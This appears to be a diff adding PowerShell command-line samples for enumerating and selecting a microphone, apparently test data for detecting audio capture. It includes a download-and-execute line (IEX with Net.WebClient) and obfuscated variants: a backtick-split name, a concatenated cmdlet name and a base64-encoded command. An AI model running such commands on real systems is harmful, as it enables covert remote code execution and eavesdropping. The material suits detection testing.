@@ -1,0 +1,5 @@
+"powershell.exe" & {$mic = Get-AudioDevice -Recording Set-AudioDevice -ID $mic.ID Start-Sleep -Seconds 5}
+powershell.exe -Command "$m = [runtime.interopservices.marshal]; # Use reflection or direct API calls to winmm.dll or dsound.dll"
+powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/frgnca/AudioDeviceCmdlets/master/AudioDeviceCmdlets.ps1'); G`et-AudioDevice -List"
+powershell.exe -Command "Import-Module AudioDeviceCmdlets; $func = 'Get-Audio' + 'Device'; & $func -List"
+powershell.exe -EncodedCommand RwBlAHQALQBBAHUAZABpAG8ARABlAHYAaQBjAGUAIAAtAEwAaQBzAHQA
